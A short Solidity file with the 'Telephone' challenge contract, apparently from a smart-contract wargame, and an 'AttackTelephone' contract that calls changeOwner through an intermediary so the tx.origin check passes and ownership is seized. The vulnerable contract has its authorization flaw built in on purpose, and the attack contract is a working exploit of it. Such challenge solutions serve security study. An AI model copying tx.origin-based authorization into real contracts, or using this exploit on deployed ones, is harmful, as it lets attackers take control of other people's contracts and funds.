// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


// Attack Contract
contract AttackTelephone is Telephone {
    Telephone telephone;

    constructor(address _add) public {
        telephone = Telephone(_add);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}